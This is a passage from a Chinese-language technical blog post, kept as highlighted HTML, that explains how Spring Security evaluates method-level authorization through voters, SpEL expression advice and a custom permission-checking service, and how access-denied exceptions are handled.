&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">vote&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Authentication authentication&lt;span style="color:#f92672">,&lt;/span> MethodInvocation method&lt;span style="color:#f92672">,&lt;/span>
Collection&lt;span style="color:#f92672">&amp;lt;&lt;/span>ConfigAttribute&lt;span style="color:#f92672">&amp;gt;&lt;/span> attributes&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// Find prefilter and preauth (or combined) attributes
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// if both null, abstain
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// else call advice with them
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
PreInvocationAttribute preAttr &lt;span style="color:#f92672">=&lt;/span> findPreInvocationAttribute&lt;span style="color:#f92672">(&lt;/span>attributes&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>preAttr &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// No expression based metadata, so abstain
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span> ACCESS_ABSTAIN&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">boolean&lt;/span> allowed &lt;span style="color:#f92672">=&lt;/span> preAdvice&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">before&lt;/span>&lt;span style="color:#f92672">(&lt;/span>authentication&lt;span style="color:#f92672">,&lt;/span> method&lt;span style="color:#f92672">,&lt;/span> preAttr&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> allowed &lt;span style="color:#f92672">?&lt;/span> ACCESS_GRANTED &lt;span style="color:#f92672">:&lt;/span> ACCESS_DENIED&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="expressionbasedpreinvocationadvicebefore">ExpressionBasedPreInvocationAdvice.before&lt;/h2>
&lt;p>这次我向你保证，ExpressionBasedPreInvocationAdvice.before 真的是专门负责判定权限校验是否通过的方法了。由于之前已经封装好了 el 表达式的 Express 对象，所以调用 ExpressionUtils.evaluateAsBoolean 就可以直接 getVaue 表达式的结果——即权限校验的结果。
举一反三一下，既然鉴权逻辑就是一个运行时的 el 表达式解析后的结果，那利用 el 表达式可以调用类方法的特性，是不是自定义一个专门的表达式处理程序就可以随心所欲地返回鉴权结果了呢？&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> &lt;span style="color:#a6e22e">before&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Authentication authentication&lt;span style="color:#f92672">,&lt;/span> MethodInvocation mi&lt;span style="color:#f92672">,&lt;/span>
PreInvocationAttribute attr&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
PreInvocationExpressionAttribute preAttr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>PreInvocationExpressionAttribute&lt;span style="color:#f92672">)&lt;/span> attr&lt;span style="color:#f92672">;&lt;/span>
EvaluationContext ctx &lt;span style="color:#f92672">=&lt;/span> expressionHandler&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">createEvaluationContext&lt;/span>&lt;span style="color:#f92672">(&lt;/span>authentication&lt;span style="color:#f92672">,&lt;/span>
mi&lt;span style="color:#f92672">);&lt;/span>
Expression preFilter &lt;span style="color:#f92672">=&lt;/span> preAttr&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getFilterExpression&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
Expression preAuthorize &lt;span style="color:#f92672">=&lt;/span> preAttr&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getAuthorizeExpression&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>preFilter &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
Object filterTarget &lt;span style="color:#f92672">=&lt;/span> findFilterTarget&lt;span style="color:#f92672">(&lt;/span>preAttr&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getFilterTarget&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> ctx&lt;span style="color:#f92672">,&lt;/span> mi&lt;span style="color:#f92672">);&lt;/span>
expressionHandler&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">filter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>filterTarget&lt;span style="color:#f92672">,&lt;/span> preFilter&lt;span style="color:#f92672">,&lt;/span> ctx&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>preAuthorize &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> ExpressionUtils&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">evaluateAsBoolean&lt;/span>&lt;span style="color:#f92672">(&lt;/span>preAuthorize&lt;span style="color:#f92672">,&lt;/span> ctx&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="自定义-el-表达式">自定义 EL 表达式&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * sysdomain + edit permission
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> String SYSDOMAIN_AND_EDITPERMISSION &lt;span style="color:#f92672">=&lt;/span> SYSDOMAIN &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34; &amp;amp;&amp;amp; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> EDIT_PERMISSION&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> String EDIT_PERMISSION_MENU &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;@authorizeAppService.hasPermission(&amp;#39;EDIT_PERMISSION_MENU&amp;#39;)&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="自定义-el-表达式处理方法">自定义 EL 表达式处理方法&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">AuthorizeAppService&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> AuthorizeAppInterface &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> &lt;span style="color:#a6e22e">hasDomain&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String domain&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> IllegalArgumentException &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>StringUtils&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isEmpty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>domain&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> IllegalArgumentException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;hasDomain accepted a invalid express parameter&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
AuthUser user &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>AuthUser&lt;span style="color:#f92672">)&lt;/span> SecurityContextHolder&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getContext&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">getAuthentication&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">getPrincipal&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> StringUtils&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>domain&lt;span style="color:#f92672">,&lt;/span> user&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getDomain&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">getCode&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> &lt;span style="color:#a6e22e">hasRole&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">...&lt;/span> role&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> IllegalArgumentException &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>ArrayUtils&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isEmpty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>role&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> IllegalArgumentException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;hasRole accepted a invalid express parameter\&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
AuthUser user &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>AuthUser&lt;span style="color:#f92672">)&lt;/span> SecurityContextHolder&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getContext&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">getAuthentication&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">getPrincipal&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> user&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getAuthRoles&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">stream&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">map&lt;/span>&lt;span style="color:#f92672">(&lt;/span>AuthRole&lt;span style="color:#f92672">::&lt;/span>getCode&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">collect&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Collectors&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">toList&lt;/span>&lt;span style="color:#f92672">()).&lt;/span>&lt;span style="color:#a6e22e">containsAll&lt;/span>&lt;span style="color:#f92672">(&lt;/span>CollectionUtils&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">arrayToList&lt;/span>&lt;span style="color:#f92672">(&lt;/span>role&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> &lt;span style="color:#a6e22e">hasPermission&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">...&lt;/span> permission&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> IllegalArgumentException &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>ArrayUtils&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isEmpty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>permission&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> IllegalArgumentException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;hasPermission accepted a invalid express parameter\&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
AuthUser user &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>AuthUser&lt;span style="color:#f92672">)&lt;/span> SecurityContextHolder&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getContext&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">getAuthentication&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">getPrincipal&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
Set&lt;span style="color:#f92672">&amp;lt;&lt;/span>String&lt;span style="color:#f92672">&amp;gt;&lt;/span> permissions &lt;span style="color:#f92672">=&lt;/span> user&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getAllpermissions&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">stream&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">map&lt;/span>&lt;span style="color:#f92672">(&lt;/span>AuthPermission&lt;span style="color:#f92672">::&lt;/span>getCode&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">collect&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Collectors&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">toSet&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> permissions&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">containsAll&lt;/span>&lt;span style="color:#f92672">(&lt;/span>CollectionUtils&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">arrayToList&lt;/span>&lt;span style="color:#f92672">(&lt;/span>permission&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>最后，我们来探讨一下 security 为什么要费尽周折，通过一长串的聚合和依赖把权限校验这个处理流程传递这么长的路径来实现？为什么不在一开始就是 make el Express and return el.value() 搞定所有的事情？&lt;/p>
&lt;p>我想这是因为 security 是一个 architect first 的设计产物。架构优先的设计，高扩展性都特别的重要。这一系列的聚合和依赖，都是「用组合解决问题」思想的体现。尽量用组合来解决问题会带来了很多好处，比如通过 GlobalMethodSecurityConfiguration 类进行的高度可配置化。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">
&lt;span style="color:#a6e22e">@Configuration&lt;/span>&lt;span style="color:#f92672">(&lt;/span>proxyBeanMethods &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#a6e22e">@Role&lt;/span>&lt;span style="color:#f92672">(&lt;/span>BeanDefinition&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">ROLE_INFRASTRUCTURE&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">GlobalMethodSecurityConfiguration&lt;/span>
&lt;span style="color:#66d9ef">implements&lt;/span> ImportAware&lt;span style="color:#f92672">,&lt;/span> SmartInitializingSingleton&lt;span style="color:#f92672">,&lt;/span> BeanFactoryAware
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Bean&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> MethodSecurityMetadataSource &lt;span style="color:#a6e22e">methodSecurityMetadataSource&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
List&lt;span style="color:#f92672">&amp;lt;&lt;/span>MethodSecurityMetadataSource&lt;span style="color:#f92672">&amp;gt;&lt;/span> sources &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ArrayList&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
ExpressionBasedAnnotationAttributeFactory attributeFactory &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ExpressionBasedAnnotationAttributeFactory&lt;span style="color:#f92672">(&lt;/span>
getExpressionHandler&lt;span style="color:#f92672">());&lt;/span>
MethodSecurityMetadataSource customMethodSecurityMetadataSource &lt;span style="color:#f92672">=&lt;/span> customMethodSecurityMetadataSource&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>customMethodSecurityMetadataSource &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
sources&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>customMethodSecurityMetadataSource&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">boolean&lt;/span> hasCustom &lt;span style="color:#f92672">=&lt;/span> customMethodSecurityMetadataSource &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">boolean&lt;/span> isPrePostEnabled &lt;span style="color:#f92672">=&lt;/span> prePostEnabled&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">boolean&lt;/span> isSecuredEnabled &lt;span style="color:#f92672">=&lt;/span> securedEnabled&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">boolean&lt;/span> isJsr250Enabled &lt;span style="color:#f92672">=&lt;/span> jsr250Enabled&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>isPrePostEnabled &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>isSecuredEnabled &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>isJsr250Enabled &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>hasCustom&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> IllegalStateException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;In the composition of all global method configuration, &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;no annotation support was actually activated&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>isPrePostEnabled&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
sources&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> PrePostAnnotationSecurityMetadataSource&lt;span style="color:#f92672">(&lt;/span>attributeFactory&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>isSecuredEnabled&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
sources&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> SecuredAnnotationSecurityMetadataSource&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>isJsr250Enabled&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
GrantedAuthorityDefaults grantedAuthorityDefaults &lt;span style="color:#f92672">=&lt;/span>
getSingleBeanOrNull&lt;span style="color:#f92672">(&lt;/span>GrantedAuthorityDefaults&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
Jsr250MethodSecurityMetadataSource jsr250MethodSecurityMetadataSource &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">context&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBean&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Jsr250MethodSecurityMetadataSource&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>grantedAuthorityDefaults &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
jsr250MethodSecurityMetadataSource&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setDefaultRolePrefix&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
grantedAuthorityDefaults&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getRolePrefix&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
sources&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>jsr250MethodSecurityMetadataSource&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> DelegatingMethodSecurityMetadataSource&lt;span style="color:#f92672">(&lt;/span>sources&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="异常处理">异常处理&lt;/h2>
&lt;p>voter 与 advicer 只做他们的份内事——对鉴权结果投票并返回。不同的得分策略，决定了同样的分数在不同的策略下，可能会有不同的最终结果。
所以 AffirmativeBased.decide 如果得出了鉴权失败的结论的话就会抛出一个 AccessDeniedException 异常。这个异常会一直沿着调用链往上抛，直到抛到 FilterSecurityIntercptor 的调用者，ExceptionTranslationFilter 中。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>deny &lt;span style="color:#f92672">&amp;gt;&lt;/span> 0&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> AccessDeniedException&lt;span style="color:#f92672">(&lt;/span>messages&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getMessage&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;AbstractAccessDecisionManager.accessDenied&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Access is denied&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ExceptionTranslationFilter 过滤器专门处理和异常相关的事情。它的 doFilter 中定义的 AccessDeniedException 捕获处理会将异常处理交由 accessDeniedHandler.handle 处理。同时得益于组合的设计思想，accessDeniedHandler.handle 也是可配置化的。&lt;/p>
&lt;p>回忆之前的自定义身份验证异常处理类 GlobalExceptionHandler。现在只要增加一个新的接口实现并重写 handle 方法，就可以在一个类里面处理身份验证和鉴权异常了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">handleSpringSecurityException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>HttpServletRequest request&lt;span style="color:#f92672">,&lt;/span>
HttpServletResponse response&lt;span style="color:#f92672">,&lt;/span> FilterChain chain&lt;span style="color:#f92672">,&lt;/span> RuntimeException exception&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#66d9ef">throws&lt;/span> IOException&lt;span style="color:#f92672">,&lt;/span> ServletException &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>exception &lt;span style="color:#66d9ef">instanceof&lt;/span> AuthenticationException&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">debug&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;Authentication exception occurred; redirecting to authentication entry point&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
exception&lt;span style="color:#f92672">);&lt;/span>
sendStartAuthentication&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">,&lt;/span> response&lt;span style="color:#f92672">,&lt;/span> chain&lt;span style="color:#f92672">,&lt;/span>
&lt;span style="color:#f92672">(&lt;/span>AuthenticationException&lt;span style="color:#f92672">)&lt;/span> exception&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>exception &lt;span style="color:#66d9ef">instanceof&lt;/span> AccessDeniedException&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
Authentication authentication &lt;span style="color:#f92672">=&lt;/span> SecurityContextHolder&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getContext&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">getAuthentication&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
